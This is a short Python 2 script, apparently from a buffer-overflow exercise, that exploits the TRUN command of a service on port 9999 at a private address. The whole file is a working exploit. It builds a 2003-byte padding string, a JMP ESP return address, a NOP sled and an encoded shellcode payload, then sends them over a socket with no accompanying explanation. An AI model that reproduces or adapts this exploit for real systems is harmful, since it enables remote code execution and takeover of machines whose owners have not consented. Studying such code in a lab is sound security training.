#!/usr/bin/python
import sys, socket

#625011af


overflow = (
"\xbd\x6d\x86\x7f\x6d\xda\xdd\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x6e\x12\x03\x6e\x12\x83\x83\x7a\x9d\x98\xa7\x6b\xe0"
"\x63\x57\x6c\x85\xea\xb2\x5d\x85\x89\xb7\xce\x35\xd9\x95\xe2"
"\xbe\x8f\x0d\x70\xb2\x07\x22\x31\x79\x7e\x0d\xc2\xd2\x42\x0c"
"\x40\x29\x97\xee\x79\xe2\xea\xef\xbe\x1f\x06\xbd\x17\x6b\xb5"
"\x51\x13\x21\x06\xda\x6f\xa7\x0e\x3f\x27\xc6\x3f\xee\x33\x91"
"\x9f\x11\x97\xa9\xa9\x09\xf4\x94\x60\xa2\xce\x63\x73\x62\x1f"
"\x8b\xd8\x4b\xaf\x7e\x20\x8c\x08\x61\x57\xe4\x6a\x1c\x60\x33"
"\x10\xfa\xe5\xa7\xb2\x89\x5e\x03\x42\x5d\x38\xc0\x48\x2a\x4e"
"\x8e\x4c\xad\x83\xa5\x69\x26\x22\x69\xf8\x7c\x01\xad\xa0\x27"
"\x28\xf4\x0c\x89\x55\xe6\xee\x76\xf0\x6d\x02\x62\x89\x2c\x4b"
"\x47\xa0\xce\x8b\xcf\xb3\xbd\xb9\x50\x68\x29\xf2\x19\xb6\xae"
"\xf5\x33\x0e\x20\x08\xbc\x6f\x69\xcf\xe8\x3f\x01\xe6\x90\xab"
"\xd1\x07\x45\x7b\x81\xa7\x36\x3c\x71\x08\xe7\xd4\x9b\x87\xd8"
"\xc5\xa4\x4d\x71\x6f\x5f\x06\xbe\xd8\x5e\xdc\x56\x1b\x60\xf1"
"\xfa\x92\x86\x9b\x12\xf3\x11\x34\x8a\x5e\xe9\xa5\x53\x75\x94"
"\xe6\xd8\x7a\x69\xa8\x28\xf6\x79\x5d\xd9\x4d\x23\xc8\xe6\x7b"
"\x4b\x96\x75\xe0\x8b\xd1\x65\xbf\xdc\xb6\x58\xb6\x88\x2a\xc2"
"\x60\xae\xb6\x92\x4b\x6a\x6d\x67\x55\x73\xe0\xd3\x71\x63\x3c"
"\xdb\x3d\xd7\x90\x8a\xeb\x81\x56\x65\x5a\x7b\x01\xda\x34\xeb"
"\xd4\x10\x87\x6d\xd9\x7c\x71\x91\x68\x29\xc4\xae\x45\xbd\xc0"
"\xd7\xbb\x5d\x2e\x02\x78\x7d\xcd\x86\x75\x16\x48\x43\x34\x7b"
"\x6b\xbe\x7b\x82\xe8\x4a\x04\x71\xf0\x3f\x01\x3d\xb6\xac\x7b"
"\x2e\x53\xd2\x28\x4f\x76")

shellcode = 'A' * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.6", 9999))
    s.send(("TRUN /.:/" + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()

